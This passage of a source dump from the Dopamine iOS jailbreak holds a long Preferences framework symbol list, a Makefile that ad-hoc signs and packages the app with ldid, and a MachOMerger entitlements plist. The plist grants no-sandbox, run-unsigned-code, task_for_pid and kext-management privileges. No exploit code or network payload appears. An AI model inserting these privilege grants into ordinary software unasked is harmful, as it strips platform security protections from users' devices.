                            _PSCoreSpotlightIndexer._prefsSearchableIndex,
                            _PSCoreSpotlightIndexer._searchQuery,
                            _PSCoreSpotlightIndexer._skipManifests,
                            _PSCoreSpotlightIndexer._spotlightIndexQueue,
                            _PSDateTimePickerCell._datePicker,
                            _PSDateTimePickerCell._titleLabel,
                            _PSDeleteButtonCell._buttonColor,
                            _PSDetailController._pane,
                            _PSDocumentsPolicyController._bundleIdentifier,
                            _PSDocumentsPolicyController._groupSpecifier,
                            _PSDocumentsPolicyController._isFirstSourceResults,
                            _PSDocumentsPolicyController._searchingContext,
                            _PSDocumentsPolicyController._selectedDocumentSource,
                            _PSEditableListController._editable,
                            _PSEditableListController._editingDisabled,
                            _PSEditableTableCell._controllerDelegate,
                            _PSEditableTableCell._delaySpecifierRelease,
                            _PSEditableTableCell._delegate,
                            _PSEditableTableCell._forceFirstResponder,
                            _PSEditableTableCell._realTarget,
                            _PSEditableTableCell._returnKeyTapped,
                            _PSEditableTableCell._targetSetter,
                            _PSEditableTableCell._textColor,
                            _PSEditableTableCell._valueChanged,
                            _PSEditingPane._delegate,
                            _PSEditingPane._requiresKeyboard,
                            _PSEditingPane._specifier,
                            _PSEditingPane._viewController,
                            _PSExpandableListGroup._collaspeAfterCount,
                            _PSExpandableListGroup._groupSpecifierID,
                            _PSExpandableListGroup._listController,
                            _PSExpandableListGroup._showAll,
                            _PSExpandableListGroup._showAllSpecifier,
                            _PSExpandableListGroup._specifiers,
                            _PSExpandableListGroup._spinnerSpecifier,
                            _PSFooterHyperlinkView._URL,
                            _PSFooterHyperlinkView._action,
                            _PSFooterHyperlinkView._linkRange,
                            _PSFooterHyperlinkView._target,
                            _PSFooterHyperlinkView._text,
                            _PSFooterHyperlinkView._textView,
                            _PSFooterHyperlinkView._textViewLeadingConstraint,
                            _PSFooterHyperlinkView._textViewTrailingConstraint,
                            _PSInternationalLanguageController._checkedLanguage,
                            _PSInternationalLanguageController._contentView,
                            _PSInternationalLanguageController._deviceLanguages,
                            _PSInternationalLanguageController._filteredDeviceLanguages,
                            _PSInternationalLanguageController._languageSelector,
                            _PSInternationalLanguageController._localeSelector,
                            _PSInternationalLanguageController._savedSearchTerm,
                            _PSInternationalLanguageController._searchBar,
                            _PSInternationalLanguageController._searchIsActive,
                            _PSInternationalLanguageController._tableView,
                            _PSInternationalLanguageSetupController._languageSelector,
                            _PSKeyboardNavigationSearchController.searchBar,
                            _PSKeyboardNavigationSearchController.searchResultsController,
                            _PSKeychainSyncHeaderView._detailLabel,
                            _PSKeychainSyncHeaderView._titleLabel,
                            _PSKeychainSyncHeaderView._usesCompactLayout,
                            _PSKeychainSyncManager._advancedSecurityCodeChoiceController,
                            _PSKeychainSyncManager._appleIDPasswordOrEquivalentToken,
                            _PSKeychainSyncManager._appleIDRawPassword,
                            _PSKeychainSyncManager._appleIDUsername,
                            _PSKeychainSyncManager._buddyNavigationController,
                            _PSKeychainSyncManager._changeSecurityCodeCompletion,
                            _PSKeychainSyncManager._circleJoinCompletion,
                            _PSKeychainSyncManager._circleNotificationToken,
                            _PSKeychainSyncManager._circleWasReset,
                            _PSKeychainSyncManager._completion,
                            _PSKeychainSyncManager._complexSecurityCodeController,
                            _PSKeychainSyncManager._credentialExpirationTimer,
                            _PSKeychainSyncManager._devicePinController,
                            _PSKeychainSyncManager._flow,
                            _PSKeychainSyncManager._hostViewController,
                            _PSKeychainSyncManager._joinAfterRecoveryTimeoutTimer,
                            _PSKeychainSyncManager._joiningCircle,
                            _PSKeychainSyncManager._joiningCircleAfterRecovery,
                            _PSKeychainSyncManager._passwordPromptCompletion,
                            _PSKeychainSyncManager._phoneNumberController,
                            _PSKeychainSyncManager._resetCompletion,
                            _PSKeychainSyncManager._resetPromptControllerHost,
                            _PSKeychainSyncManager._securityCodeRecoveryAttempt,
                            _PSKeychainSyncManager._securityCodeRecoveryController,
                            _PSKeychainSyncManager._settingsSetupController,
                            _PSKeychainSyncManager._simpleSecurityCodeController,
                            _PSKeychainSyncManager._smsValidationController,
                            _PSKeychainSyncManager._spinnerCount,
                            _PSKeychainSyncManager._spinningView,
                            _PSKeychainSyncManager._stagedSecurityCode,
                            _PSKeychainSyncManager._stagedSecurityCodeType,
                            _PSKeychainSyncPhoneNumber._countryInfo,
                            _PSKeychainSyncPhoneNumber._digits,
                            _PSKeychainSyncSecurityCodeController._firstPasscodeEntry,
                            _PSKeychainSyncSecurityCodeController._footerButton,
                            _PSKeychainSyncSecurityCodeController._footerLabel,
                            _PSKeychainSyncSecurityCodeController._generatedCode,
                            _PSKeychainSyncSecurityCodeController._keyboardHeight,
                            _PSKeychainSyncSecurityCodeController._mode,
                            _PSKeychainSyncSecurityCodeController._securityCodeType,
                            _PSKeychainSyncSecurityCodeController._showsAdvancedSettings,
                            _PSKeychainSyncTextEntryController._convertsNumeralsToASCII,
                            _PSKeychainSyncTextEntryController._hidesNextButton,
                            _PSKeychainSyncTextEntryController._numberOfPasscodeFields,
                            _PSKeychainSyncTextEntryController._secureTextEntry,
                            _PSKeychainSyncTextEntryController._textEntryCell,
                            _PSKeychainSyncTextEntryController._textEntrySpecifier,
                            _PSKeychainSyncTextEntryController._textEntryType,
                            _PSKeychainSyncTextEntryController._textEntryView,
                            _PSKeychainSyncTextEntryController._textFieldHasRoundBorder,
                            _PSKeychainSyncTextEntryController._textValue,
                            _PSKeychainSyncViewController._delegate,
                            _PSKeychainSyncViewController._groupSpecifier,
                            _PSKeychainSyncViewController._headerView,
                            _PSLanguage._languageCode, _PSLanguage._languageName,
                            _PSLanguage._localizedLanguageName,
                            _PSLargeTextController._extendedRangeSliderListController,
                            _PSLargeTextController._showsExtendedRangeSwitch,
                            _PSLargeTextController._sliderListController,
                            _PSLargeTextController._usesExtendedRange,
                            _PSLargeTextSliderListController._contentSizeCategories,
                            _PSLargeTextSliderListController._selectedCategoryIndex,
                            _PSLargeTextSliderListController._showsExtendedRangeSwitch,
                            _PSLargeTextSliderListController._showsLargerSizesHelpText,
                            _PSLargeTextSliderListController._sliderGroupSpecifier,
                            _PSLargeTextSliderListController._usesExtendedRange,
                            _PSLargeTextSliderListController._viewIsDisappearing,
                            _PSLazyImagePromise._image,
                            _PSLazyImagePromise._imageBundle,
                            _PSLazyImagePromise._imageLoaded,
                            _PSLazyImagePromise._imageName,
                            _PSLazyImagePromise._imagePath,
                            _PSLazyImagePromise._loadBlock,
                            _PSLegalMessagePane._webView,
                            _PSLegendColorView._color,
                            _PSListController._altTextColor,
                            _PSListController._backgroundColor,
                            _PSListController._bundleControllers,
                            _PSListController._bundlesLoaded,
                            _PSListController._buttonTextColor,
                            _PSListController._cachesCells,
                            _PSListController._cellAccessoryColor,
                            _PSListController._cellAccessoryHighlightColor,
                            _PSListController._cellHighlightColor,
                            _PSListController._cells,
                            _PSListController._containerView,
                            _PSListController._contentOffsetWithKeyboard,
                            _PSListController._contentSizeDidChange,
                            _PSListController._dataSource,
                            _PSListController._edgeToEdgeCells,
                            _PSListController._editableInsertionPointColor,
                            _PSListController._editablePlaceholderTextColor,
                            _PSListController._editableSelectionBarColor,
                            _PSListController._editableSelectionHighlightColor,
                            _PSListController._editableTextColor,
                            _PSListController._footerHyperlinkColor,
                            _PSListController._forceSynchronousIconLoadForCreatedCells,
                            _PSListController._foregroundColor,
                            _PSListController._groups,
                            _PSListController._hasAppeared,
                            _PSListController._highlightItemName,
                            _PSListController._isVisible,
                            _PSListController._keyboard,
                            _PSListController._keyboardWasVisible,
                            _PSListController._offsetItemName,
                            _PSListController._padSelectionColor,
                            _PSListController._pendingURLResourceDictionary,
                            _PSListController._popupIsDismissing,
                            _PSListController._popupIsModal,
                            _PSListController._prefetchingEnabled,
                            _PSListController._prequeuedReusablePSTableCells,
                            _PSListController._requestingSpecifiersFromDataSource,
                            _PSListController._reusesCells,
                            _PSListController._savedSelectedIndexPath,
                            _PSListController._sectionContentInsetInitialized,
                            _PSListController._segmentedSliderTrackColor,
                            _PSListController._separatorColor,
                            _PSListController._showingSetupController,
                            _PSListController._specifierID,
                            _PSListController._specifierIDPendingPush,
                            _PSListController._specifiers,
                            _PSListController._specifiersByID,
                            _PSListController._table,
                            _PSListController._textColor,
                            _PSListController._urlHandler,
                            _PSListController._urlHandlingCompletion,
                            _PSListController._usesDarkTheme,
                            _PSListController._verticalContentOffset,
                            _PSListItemsController._deferItemSelection,
                            _PSListItemsController._lastSelectedSpecifier,
                            _PSListItemsController._restrictionList,
                            _PSListItemsController._retainedTarget,
                            _PSListItemsController._rowToSelect,
                            _PSLocaleController._contentView,
                            _PSLocaleController._currentRegion,
                            _PSLocaleController._filteredListContent,
                            _PSLocaleController._hideKeyboardInSearchMode,
                            _PSLocaleController._localeSelector,
                            _PSLocaleController._regionsList,
                            _PSLocaleController._searchBar,
                            _PSLocaleController._searchMode,
                            _PSLocaleController._sections,
                            _PSLocaleController._tableView,
                            _PSNavBarSpinnerManager._savedRecords,
                            _PSNotificationSettingsController._gateway,
                            _PSNotificationSettingsController._queue,
                            _PSNotificationSettingsController._sectionInfosByIdentifier,
                            _PSOAuthAccountRedirectURLController._redirectHandlerMap,
                            _PSPasscodeField._dashViews,
                            _PSPasscodeField._delegate,
                            _PSPasscodeField._digitViews,
                            _PSPasscodeField._dotFullViews,
                            _PSPasscodeField._dotOutlineViews,
                            _PSPasscodeField._enabled,
                            _PSPasscodeField._fieldSpacing,
                            _PSPasscodeField._foregroundColor,
                            _PSPasscodeField._keyboardAppearance,
                            _PSPasscodeField._numberOfEntryFields,
                            _PSPasscodeField._securePasscodeEntry,
                            _PSPasscodeField._shouldBecomeFirstResponderOnTap,
                            _PSPasscodeField._stringValue,
                            _PSPhoneNumberSpecifier._countryCode,
                            _PSPhotoServicesAuthorizationLevelController._clientIdentifier,
                            _PSPhotoServicesAuthorizationLevelController._details,
                            _PSPhotoServicesAuthorizationLevelController._displayName,
                            _PSPhotoServicesAuthorizationLevelController._entityBundle,
                            _PSPhotoServicesAuthorizationLevelController._modifySelectionButton,
                            _PSPhotoServicesAuthorizationLevelController._modifySelectionSpecifiers,
                            _PSQuotaInfo._mediaKindDict,
                            _PSQuotaInfo._totalStorage,
                            _PSQuotaInfo._usedStorage, _PSRegion._regionCode,
                            _PSRegion._regionName,
                            _PSRootController._deallocating,
                            _PSRootController._specifier,
                            _PSRootController._stackAnimationController,
                            _PSRootController._supportedOrientationsOverride,
                            _PSRootController._tasks,
                            _PSSearchController._delegate,
                            _PSSearchController._iconForSearchEntryHandler,
                            _PSSearchController._listController,
                            _PSSearchController._notifyToken,
                            _PSSearchController._resultsController,
                            _PSSearchController._searchController,
                            _PSSearchController._searchEnabled,
                            _PSSearchEntry._action,
                            _PSSearchEntry._additionalDetailTextComponents,
                            _PSSearchEntry._bundleName,
                            _PSSearchEntry._childEntries,
                            _PSSearchEntry._groupName,
                            _PSSearchEntry._groupSpecifier,
                            _PSSearchEntry._hasDetailController,
                            _PSSearchEntry._hasListController,
                            _PSSearchEntry._identifier,
                            _PSSearchEntry._isRootURL, _PSSearchEntry._isSection,
                            _PSSearchEntry._keywords,
                            _PSSearchEntry._manifestBundleName,
                            _PSSearchEntry._name, _PSSearchEntry._parentEntry,
                            _PSSearchEntry._plistName,
                            _PSSearchEntry._sectionIdentifier,
                            _PSSearchEntry._specifier, _PSSearchEntry._url,
                            _PSSearchIndexOperation._delegate,
                            _PSSearchIndexOperation._searchEntry,
                            _PSSearchModel._activeSearchOperation,
                            _PSSearchModel._currentQuery,
                            _PSSearchModel._currentResults,
                            _PSSearchModel._dataSource,
                            _PSSearchModel._deferredSpecifierUpdates,
                            _PSSearchModel._delegates,
                            _PSSearchModel._entriesBeingIndexed,
                            _PSSearchModel._entriesPendingSearch,
                            _PSSearchModel._hasLoadedRootEntries,
                            _PSSearchModel._hasStartedIndexing,
                            _PSSearchModel._indexOperationQueue,
                            _PSSearchModel._indexing,
                            _PSSearchModel._indexingEntriesWithLoadedDataSources,
                            _PSSearchModel._queryForCurrentResults,
                            _PSSearchModel._removedEntriesStillIndexing,
                            _PSSearchModel._removedEntriesStillSearching,
                            _PSSearchModel._rootEntries,
                            _PSSearchModel._searchOperationQueue,
                            _PSSearchModel._searchStateAccessQueue,
                            _PSSearchModel._showSectionInDetailText,
                            _PSSearchModel._specifierDataSources,
                            _PSSearchModel._waitUntilFinished,
                            _PSSearchOperation._currentResults,
                            _PSSearchOperation._delegate,
                            _PSSearchOperation._newQuery,
                            _PSSearchOperation._query,
                            _PSSearchOperation._rootEntries,
                            _PSSearchResults._entriesBySection,
                            _PSSearchResults._entryComparator,
                            _PSSearchResults._explicitlyAddedSectionEntries,
                            _PSSearchResults._needsSorting,
                            _PSSearchResults._sectionComparator,
                            _PSSearchResults._sectionEntries,
                            _PSSearchResults._treatSectionEntriesAsRegularEntries,
                            _PSSearchResultsCell._shouldIndentContent,
                            _PSSearchResultsCell._shouldIndentSeparator,
                            _PSSearchResultsController._delegate,
                            _PSSearchResultsController._iconViewMap,
                            _PSSearchResultsController._reusableIconViews,
                            _PSSearchResultsController._searchResults,
                            _PSSearchResultsController._tableView,
                            _PSSearchableItem._bundleID,
                            _PSSearchableItem._category,
                            _PSSearchableItem._classIdentifier,
                            _PSSearchableItem._contentDescription,
                            _PSSearchableItem._identifier,
                            _PSSearchableItem._keywords, _PSSearchableItem._name,
                            _PSSearchableItem._rankingHint,
                            _PSSearchableItem._requiredCapabilities,
                            _PSSearchableItem._requiredCapabilitiesOr,
                            _PSSearchableItem._url,
                            _PSSearchableItemManifest._searchableItems,
                            _PSSegmentTableCell._titleDict,
                            _PSSegmentTableCell._values,
                            _PSSegmentableSlider._feedbackGenerator,
                            _PSSegmentableSlider._locksToSegment,
                            _PSSegmentableSlider._segmentCount,
                            _PSSegmentableSlider._segmented,
                            _PSSegmentableSlider._snapsToSegment,
                            _PSSegmentableSlider._trackMarkersColor,
                            _PSSetupController._parentController,
                            _PSSetupController._parentRootController,
                            _PSSetupController._rootInfo,
                            _PSSliderTableCell._disabledView,
                            _PSSoftwareUpdateAnimatedIcon._animating,
                            _PSSoftwareUpdateAnimatedIcon._innerGearView,
                            _PSSoftwareUpdateAnimatedIcon._outerGearShadowView,
                            _PSSoftwareUpdateAnimatedIcon._outerGearView,
                            _PSSoftwareUpdateLicenseViewController._licenseTextInfo,
                            _PSSoftwareUpdateLicenseViewController._licenseTextView,
                            _PSSoftwareUpdateReleaseNotesDetail._releaseNotes,
                            _PSSoftwareUpdateTableView._checkingForUpdateSpinner,
                            _PSSoftwareUpdateTableView._checkingStatusLabel,
                            _PSSoftwareUpdateTableView._currentVersion,
                            _PSSoftwareUpdateTableView._state,
                            _PSSoftwareUpdateTableView._subtitleLabel,
                            _PSSoftwareUpdateTableView._updatesDeferred,
                            _PSSoftwareUpdateTermsManager._agreeToCombinedTOSInProgress,
                            _PSSoftwareUpdateTermsManager._hostController,
                            _PSSoftwareUpdateTermsManager._overrideNextRUIAction,
                            _PSSoftwareUpdateTermsManager._presentedViewController,
                            _PSSoftwareUpdateTermsManager._serverFlowStyle,
                            _PSSoftwareUpdateTermsManager._showProgressViewController,
                            _PSSoftwareUpdateTermsManager._termsCompletion,
                            _PSSoftwareUpdateTermsManager._termsRemoteUI,
                            _PSSoftwareUpdateTermsManager._update,
                            _PSSoftwareUpdateTitleCell._animatedGearView,
                            _PSSoftwareUpdateTitleCell._animatingGearView,
                            _PSSoftwareUpdateTitleCell._gearBackgroundImageView,
                            _PSSoftwareUpdateTitleCell._progressBar,
                            _PSSoftwareUpdateTitleCell._progressStyle,
                            _PSSoftwareUpdateTitleCell._releaseNotesSummaryView,
                            _PSSoftwareUpdateTitleCell._updateStatusLabel,
                            _PSSoftwareUpdateTitleCell._updateStatusLabelVerticalConstraint,
                            _PSSpecifier._buttonAction,
                            _PSSpecifier._confirmationAction,
                            _PSSpecifier._confirmationAlternateAction,
                            _PSSpecifier._confirmationCancelAction,
                            _PSSpecifier._controllerLoadAction,
                            _PSSpecifier._name, _PSSpecifier._properties,
                            _PSSpecifier._shortTitleDict,
                            _PSSpecifier._showContentString,
                            _PSSpecifier._titleDict, _PSSpecifier._userInfo,
                            _PSSpecifier._values, _PSSpecifier._weakUserInfo,
                            _PSSpecifier.action, _PSSpecifier.autoCapsType,
                            _PSSpecifier.autoCorrectionType, _PSSpecifier.cancel,
                            _PSSpecifier.cellType,
                            _PSSpecifier.detailControllerClass,
                            _PSSpecifier.editPaneClass, _PSSpecifier.getter,
                            _PSSpecifier.keyboardType, _PSSpecifier.setter,
                            _PSSpecifier.target, _PSSpecifier.textFieldType,
                            _PSSpecifierAction._getter,
                            _PSSpecifierAction._setter,
                            _PSSpecifierController._bundleControllers,
                            _PSSpecifierController._groups,
                            _PSSpecifierController._specifier,
                            _PSSpecifierController._specifiers,
                            _PSSpecifierController._viewController,
                            _PSSpecifierDataSource._observerRefs,
                            _PSSpecifierDataSource._specifiers,
                            _PSSpecifierDataSource._specifiersLoaded,
                            _PSSpecifierGroupIndex._groupSections,
                            _PSSpecifierGroupIndex._groupSpecifiers,
                            _PSSpecifierGroupIndex._specifiers,
                            _PSSpecifierGroupIndex._ungroupedPrefixSpecifiers,
                            _PSSpecifierGroupIndex._wantsDebugCallbacks,
                            _PSSpecifierUpdateContext._animated,
                            _PSSpecifierUpdateContext._updateModelOnly,
                            _PSSpecifierUpdateContext._userInfo,
                            _PSSpecifierUpdateOperation._index,
                            _PSSpecifierUpdateOperation._operation,
                            _PSSpecifierUpdateOperation._removingGroupSpecifierRemovesEntireGroup,
                            _PSSpecifierUpdateOperation._specifier,
                            _PSSpecifierUpdateOperation._toIndex,
                            _PSSpecifierUpdates._context,
                            _PSSpecifierUpdates._currentSpecifiers,
                            _PSSpecifierUpdates._groupIndex,
                            _PSSpecifierUpdates._originalSpecifiers,
                            _PSSpecifierUpdates._updates,
                            _PSSpecifierUpdates._wantsDebugCallbacks,
                            _PSSpinnerRecord._hidesBackButton,
                            _PSSpinnerRecord._leftItems,
                            _PSSpinnerRecord._navigationItem,
                            _PSSpinnerRecord._rightItems,
                            _PSSpinnerTableCell._spinner,
                            _PSSplitViewController._containerNavigationController,
                            _PSSplitViewController._navigationDelegate,
                            _PSSpotlightSearchResultsController._delegate,
                            _PSSpotlightSearchResultsController._deviceOrientation,
                            _PSSpotlightSearchResultsController._iconViewMap,
                            _PSSpotlightSearchResultsController._results,
                            _PSSpotlightSearchResultsController._reusableIconViews,
                            _PSSpotlightSearchResultsController._tableData,
                            _PSSpotlightSearchResultsController.originalInset,
                            _PSStackPushAnimationController._animationPreset,
                            _PSStackPushAnimationController._animationsToRunAlongsideToVC,
                            _PSStackPushAnimationController._completionBlock,
                            _PSStackPushAnimationController._completionStagger,
                            _PSStackPushAnimationController._hasStartedAnimation,
                            _PSStackPushAnimationController._navigationController,
                            _PSStackPushAnimationController._pushDuration,
                            _PSStackPushAnimationController._snapshots,
                            _PSStackPushAnimationController._springDamping,
                            _PSStackPushAnimationController._startStagger,
                            _PSStackPushAnimationController._viewControllers,
                            _PSSubtitleDisclosureTableCell._valueLabel,
                            _PSSwitchTableCell._activityIndicator,
                            _PSSystemConfiguration._prefs,
                            _PSSystemConfigurationDynamicStoreEthernetWatcher._dynamicStore,
                            _PSSystemConfigurationDynamicStoreEthernetWatcher._dynamicStoreSource,
                            _PSSystemConfigurationDynamicStoreNETRBWatcher._netrbReason,
                            _PSSystemConfigurationDynamicStoreNETRBWatcher._netrbState,
                            _PSSystemConfigurationDynamicStoreNETRBWatcher._scDynamicStore,
                            _PSSystemConfigurationDynamicStoreNETRBWatcher._scRunLoopSource,
                            _PSSystemConfigurationDynamicStoreWifiWatcher._prefs,
                            _PSSystemConfigurationDynamicStoreWifiWatcher._tetheringLink,
                            _PSSystemConfigurationDynamicStoreWifiWatcher._wifiInterface,
                            _PSSystemConfigurationDynamicStoreWifiWatcher._wifiKey,
                            _PSSystemPolicyForApp._accountEnumerator,
                            _PSSystemPolicyForApp._bundleIdentifier,
                            _PSSystemPolicyForApp._contactsPrivacyController,
                            _PSSystemPolicyForApp._delegate,
                            _PSSystemPolicyForApp._enServiceMatched,
                            _PSSystemPolicyForApp._forcePolicyOptions,
                            _PSSystemPolicyForApp._matchingBundleIdentifier,
                            _PSSystemPolicyForApp._pathControllerConfiguration,
                            _PSSystemPolicyForApp._photosPrivacyController,
                            _PSSystemPolicyForApp._policyOptions,
                            _PSTableCell._alignment, _PSTableCell._cellEnabled,
                            _PSTableCell._checked,
                            _PSTableCell._checkedImageView,
                            _PSTableCell._customHighlightContext,
                            _PSTableCell._forceHideDisclosureIndicator,
                            _PSTableCell._hiddenTitle, _PSTableCell._isCopyable,
                            _PSTableCell._lazyIcon, _PSTableCell._lazyIconAppID,
                            _PSTableCell._lazyIconDontUnload,
                            _PSTableCell._lazyIconForceSynchronous,
                            _PSTableCell._lazyIconURL,
                            _PSTableCell._longTapRecognizer,
                            _PSTableCell._pAction, _PSTableCell._pTarget,
                            _PSTableCell._reusedCell,
                            _PSTableCell._shouldHideTitle,
                            _PSTableCell._specifier, _PSTableCell._type,
                            _PSTableCell._urlSession, _PSTableCell._value,
                            _PSTableCellHighlightContext._animateUnhighlight,
                            _PSTableCellHighlightContext._cell,
                            _PSTableCellHighlightContext._originalSelectionStyle,
                            _PSTableCellHighlightContext._timer,
                            _PSTableCellHighlightContext._valid,
                            _PSTextEditingPane._cell, _PSTextEditingPane._table,
                            _PSTextEditingPane._textField,
                            _PSTextFieldPINView._cell,
                            _PSTextFieldPINView._passcodeField,
                            _PSTextFieldPINView._table,
                            _PSTextFieldPINView._usesNumericKeyboard,
                            _PSTextFieldSpecifier._placeholder,
                            _PSTextFieldSpecifier.bestGuess, _PSTextView._cell,
                            _PSTextViewPane._textView,
                            _PSTextViewTableCell._textView,
                            _PSThirdPartyApp._localizedName,
                            _PSThirdPartyApp._proxy,
                            _PSThirdPartyAppController._appPolicy,
                            _PSThirdPartyAppController._systemPolicy,
                            _PSThirdPartyAppViewController._parent,
                            _PSThirdPartyAppViewController._root,
                            _PSThirdPartyAppViewController._specifierController,
                            _PSTimeRangeCell._constraints,
                            _PSTimeRangeCell._delegate,
                            _PSTimeRangeCell._fromTime,
                            _PSTimeRangeCell._fromTitle,
                            _PSTimeRangeCell._toTime, _PSTimeRangeCell._toTitle,
                            _PSTimeZoneController._cities,
                            _PSTimeZoneController._parentController,
                            _PSTimeZoneController._searchController,
                            _PSTimeZoneController._specifier,
                            _PSTimeZoneTableCell._city,
                            _PSTrackingWelcomeController._controller,
                            _PSURLControllerHandler._delegate,
                            _PSURLManager._rootController,
                            _PSURLManager._splitViewController,
                            _PSURLManager._topLevelController,
                            _PSUsageBundleApp._bundleIdentifier,
                            _PSUsageBundleApp._categories,
                            _PSUsageBundleApp._deletionRestricted,
                            _PSUsageBundleApp._name,
                            _PSUsageBundleApp._storageReporterReference,
                            _PSUsageBundleApp._totalSize,
                            _PSUsageBundleCategory._identifier,
                            _PSUsageBundleCategory._name,
                            _PSUsageBundleCategory._usageBundleApp,
                            _PSUsageBundleManager._bundleMap,
                            _PSUsageBundleManager._storageReporters,
                            _PSUsageBundleManager._usageBundleApps,
                            _PSUsageSizeHeader._labelLeadingConstraint,
                            _PSUsageSizeHeader._labelTrailingConstraint,
                            _PSUsageSizeHeader._sizeLabel,
                            _PSUsageSizeHeader._titleLabel,
                            _PSViewController._parentController,
                            _PSViewController._rootController,
                            _PSViewController._specifier,
                            _PSWeakReference._location,
                            _PSWebContainerView._content,
                            _PSWebContainerView._webView,
                            _PasscodeFieldCell._convertsNumeralsToASCII,
                            _PasscodeFieldCell._delegate,
                            _PasscodeFieldCell._denyFirstResponder,
                            _PasscodeFieldCell._passcodeField,
                            _PrefsUILinkLabel._URL, _PrefsUILinkLabel._action,
                            _PrefsUILinkLabel._target,
                            _PrefsUILinkLabel._touchingURL,
                            _PrefsUILinkLabel._url,
                            _ProblemReportingController._aboutDiagnosticsLinkLabel,
                            _ProblemReportingController._appActivitySpecifiers,
                            _ProblemReportingController._assistantSettingsConnection,
                            _ProblemReportingController._automatedFeedbackSpecifiers,
                            _ProblemReportingController._filesystemMetadataSnapshotSpecifier,
                            _ProblemReportingController._fitnessPlusAnalyticsConsentCoordinator,
                            _ProblemReportingController._fitnessPlusDataSpecifiers,
                            _ProblemReportingController._handwashingDataSpecifiers,
                            _ProblemReportingController._healthDataSpecifiers,
                            _ProblemReportingController._healthRecordsDataSpecifiers,
                            _ProblemReportingController._healthStore,
                            _ProblemReportingController._iCloudSpecifiers,
                            _ProblemReportingController._improveSiriSpecifiers,
                            _ProblemReportingController._shouldShareHealthRecordsData,
                            _ProblemReportingController._spinnerSpecifier,
                            _ProblemReportingController._wheelchairDataSpecifiers,
                            _SUIKSearchResultCollectionViewListCell._searchableItem,
                            _SUIKSearchResultCollectionViewSectionHeader._categoryImageView,
                            _SUIKSearchResultsCollectionViewController._delegate,
                            _SUIKSearchResultsCollectionViewController._diffableDataSource,
                            _SUIKSearchResultsCollectionViewController._updateOperation,
                            __PSDeferredUpdates._invalidatedSpecifiers,
                            __PSDeferredUpdates._searchEntries,
                            __PSDeferredUpdates._specifierUpdates,
                            __PSSpinnerViewController._spinner,
                            __SUIKSearchResultsUpdateOperation._delegate,
                            __SUIKSearchResultsUpdateOperation._diffableDataSource,
                            __SUIKSearchResultsUpdateOperation._results ]
...

```

`Application/Makefile`:

```
.PHONY: all clean build_clean

all: Dopamine.ipa

Dopamine.ipa: build/Build/Products/Debug-iphoneos/Dopamine.app
	@echo Ad-Hoc signing Dopamine
	xattr -rc build/Build/Products/Debug-iphoneos/Dopamine.app
	ldid -SDopamine/Dopamine.entitlements build/Build/Products/Debug-iphoneos/Dopamine.app/Dopamine
	ldid -s build/Build/Products/Debug-iphoneos/Dopamine.app
	rm -rf Payload Dopamine.ipa
	mkdir Payload
	cp -r build/Build/Products/Debug-iphoneos/Dopamine.app Payload/Dopamine.app
	zip -Ar Dopamine.ipa Payload
	rm -rf Payload
	rm -rf Dopamine.tipa
	cp Dopamine.ipa Dopamine.tipa

ifeq ($(NIGHTLY), 1)
build/Build/Products/Debug-iphoneos/Dopamine.app: FORCE
	xcodebuild -scheme Dopamine -derivedDataPath build -destination 'generic/platform=iOS' CODE_SIGN_IDENTITY="" CODE_SIGNING_REQUIRED=NO GCC_PREPROCESSOR_DEFINITIONS='NIGHTLY=1 COMMIT_HASH=\"$(COMMIT_HASH)\"'
else
build/Build/Products/Debug-iphoneos/Dopamine.app: FORCE
	xcodebuild -scheme Dopamine -derivedDataPath build -destination 'generic/platform=iOS' CODE_SIGN_IDENTITY="" CODE_SIGNING_REQUIRED=NO
endif

clean:
	rm -rf build Payload Dopamine.ipa Dopamine.tipa

build_clean:
	rm -rf Payload build

FORCE: ;
```

`BaseBin/MachOMerger/MachOMerger.entitlements`:

```entitlements
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>com.apple.security.get-task-allow</key>
	<true/>
	<key>get-task-allow</key>
	<true/>
	<key>platform-application</key>
	<true/>
	<key>task_for_pid-allow</key>
	<true/>
	<key>run-unsigned-code</key>
	<true/>
	<key>proc_info-allow</key>
	<true/>
	<key>com.apple.private.persona-mgmt</key>
	<true/>
	<key>com.apple.private.tcc.allow</key>
	<array>
		<string>kTCCServiceSystemPolicyAllFiles</string>
	</array>
	<key>com.apple.private.security.no-container</key>
	<true/>
	<key>com.apple.private.security.storage-exempt.heritable</key>
	<true/>
	<key>com.apple.private.security.storage.AppBundles</key>
	<true/>
	<key>com.apple.private.security.no-sandbox</key>
	<true/>
	<key>com.apple.springboard.CFUserNotification</key>
	<true/>
	<key>com.apple.springboard.launchapplications</key>
	<true/>
	<key>com.apple.security.network.client</key>
	<true/>
	<key>com.apple.system-task-ports.control</key>
	<true/>
	<key>com.apple.system-task-ports.token.control</key>
	<true/>
	<key>com.apple.private.mobileinstall.allowedSPI</key>
	<array>
		<string>InstallForLaunchServices</string>
		<string>Install</string>
		<string>UninstallForLaunchServices</string>
		<string>Uninstall</string>
		<string>UpdatePlaceholderMetadata</string>
	</array>
	<key>com.apple.private.spawn-driver</key>
	<true/>
	<key>com.apple.developer.driverkit</key>
	<true/>
	<key>com.apple.developer.driverkit.transport.pci</key>
	<true/>
	<key>com.apple.developer.driverkit.builtin</key>
	<true/>
	<key>com.apple.developer.driverkit.transport.pci.offloadEngineDisable</key>
	<true/>
	<key>com.apple.private.security.kext-collection-management</key>
	<true/>
	<key>com.apple.private.security.kext-management</key>
	<true/>
	<key>com.apple.private.security.syspolicy.kext-management</key>
	<true/>
	<key>com.apple.private.bindfs-allow</key>
	<true/>
	<key>com.apple.private.security.disk-device-access</key>
	<true/>
	<key>com.apple.private.apfs.xart</key>
	<true/>
	<key>com.apple.private.security.system-async-io</key>
	<true/>
	<key>com.apple.security.iokit-user-client-class</key>
	<array>
		<string>AppleAPFSUserClient</string>
	</array>
</dict>
</plist>

```

`BaseBin/MachOMerger/Makefile`:

```
MACOS ?= 0

ifeq ($(MACOS), 1)
ENTITLEMENTS_ARG=
SDK=macosx
TARGET=arm64-apple-macos11.0
else
ENTITLEMENTS_ARG=--entitlements MachOMerger.entitlements
SDK=iphoneos
TARGET=arm64-apple-ios14.0
endif

SDK_PATH=$(shell xcrun --sdk $(SDK) --show-sdk-path)

CONFIG=debug

SWIFTC_ARGS=-sdk "$(SDK_PATH)" -target $(TARGET) -O -framework IOKit -framework CoreServices -D__DARWIN_OPAQUE_ARM_THREAD_STATE64
